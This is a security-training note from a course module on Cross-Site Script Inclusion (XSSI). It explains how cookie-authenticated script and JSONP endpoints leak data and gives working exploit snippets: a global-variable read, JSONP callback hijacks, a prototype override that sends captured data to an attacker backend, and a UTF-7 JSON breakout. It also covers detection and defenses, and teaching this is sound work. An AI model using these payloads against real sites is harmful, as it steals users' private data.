---
tags: [vapt, advanced, xssi, jsonp, data-leak, same-origin-policy, intermediate]
difficulty: intermediate
module: "58 - Advanced Web Techniques"
topic: "58.26 XSSI (Cross-Site Script Inclusion)"
---

# 58.26 — XSSI (Cross-Site Script Inclusion)

## What is it?
Cross-Site Script Inclusion (XSSI) abuses one specific hole in the **Same-Origin Policy (SOP)**: while SOP blocks reading most cross-origin resources, the `<script src="...">` tag is allowed to **load scripts from any domain** (so libraries/CDNs work). The catch — when the browser fetches that cross-origin script, it **automatically sends the user's cookies** (ambient authority). If the "script" actually contains the victim's private data, an attacker's page can include it and read the leaked values.

Think of it like a vending machine that, when *anyone* presses the button, dispenses a snack billed to *your* account because your wallet (cookie) is auto-attached. The attacker presses the button from their own site and walks off with your snack (data).

XSSI is mainly a problem for **dynamic JavaScript** and **JSONP** endpoints that embed user-specific data and authenticate via cookies.

## Why it works
1. Attacker's page includes `<script src="https://victim-app/userdata.js">`.
2. Browser sends the request **with the victim's cookies** (cross-origin scripts get ambient credentials).
3. The endpoint returns the victim's private data *as JavaScript*.
4. Attacker's page reads it — by capturing a global variable, hijacking a JSONP callback, or prototype tampering.

## Types of XSSI
1. **Static JavaScript** — classic case: secrets baked into a globally reachable `.js` file.
2. **Static JavaScript with authentication** — same, but the file requires a session (cookies make it reachable cross-site).
3. **Dynamic JavaScript** — server generates per-user JS content.
4. **Non-JavaScript** — leaking non-JS files (e.g. CSV) by loading them as a `<script src>`.

## Exploitation

### Regular XSSI (secrets in a global variable)
Private info sits in a global object inside an includable JS file. Include it, then read the global:
```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script>
  alert(JSON.stringify(confidential_keys[0]))
</script>
```

### Dynamic / Authenticated XSSI — JSONP callback hijack
**Detection:** request the endpoint **with and without cookies** and diff the responses. If the authenticated response contains extra (private) data, it's leakable.

If the data is delivered via a JSONP callback, define the callback function yourself and capture the data:
```html
<script>
  var angular = function () { return 1 }
  angular.callbacks = function () { return 1 }
  angular.callbacks._7 = function (leaked) {
    alert(JSON.stringify(leaked))
  }
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```
Or the simpler form:
```html
<script>
  leak = function (leaked) { alert(JSON.stringify(leaked)) }
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```

### Prototype tampering (data not in global scope)
When the secret isn't a global, override a built-in that the response will call (e.g. `Array.prototype.slice`) to capture `this`:
```javascript
Array.prototype.slice = function () {
  // leaks the array contents, e.g. ["secret1", "secret2", "secret3"]
  sendToAttackerBackend(this)
}
```

### Non-Script XSSI (leaking CSV / data files)
Non-JS files can be pulled cross-origin by including them as a script source. A known variant uses **UTF-7 encoded JSON** to break out of the JSON format and execute script in browsers that honour the `charset`:
```javascript
;[
  {
    friend: "luke",
    email: "+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-"
  }
]
```
```html
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```

## ASCII Diagram
```text
================================================================================
                              XSSI DATA LEAK
================================================================================

  [attacker.com page]                         [victim-app.com]
  <script src=                                 /userdata?jsonp=leak
   "victim-app.com/userdata?jsonp=leak">           |
        |  browser auto-attaches victim cookies     |
        |------------------------------------------>|
        |                                           | returns:
        |<------ leak({ "ssn":"...", ... }) --------|  leak({secret})
        |
   attacker-defined leak() runs => reads victim's private JSON
================================================================================
```

## Hands-on detection
1. Find endpoints returning JS/JSONP that include **user-specific** data.
2. Send the request **with** and **without** session cookies — diff the bodies. A difference = credentialed, leakable content.
3. Check whether private data lands in a **global var** (read it) or a **JSONP callback** (hijack it).
4. Automate the with/without-cookie diff using the **DetectDynamicJS** Burp extension.

## Defense
- **Don't serve sensitive data as executable JavaScript or JSONP.** Use plain JSON returned via `fetch`/`XHR` (which SOP *does* protect) instead of `<script>` includes.
- **Prefix JSON responses** with an anti-parsing guard like `)]}',\n` so they can't be loaded as a script.
- Require a **custom header / CSRF token** on data endpoints (cross-origin `<script>` can't set custom headers).
- Set `Content-Type: application/json` and `X-Content-Type-Options: nosniff` so the browser refuses to execute the response as JS.
- Avoid JSONP entirely for authenticated data; if needed, restrict callbacks to a strict allowlist.

## Related
- [[../I - 12 - CORS/01 - What is CORS]] — the other cross-origin data-access topic
- [[20 - Postmessage Vulnerabilities]] — sibling cross-origin leak vector
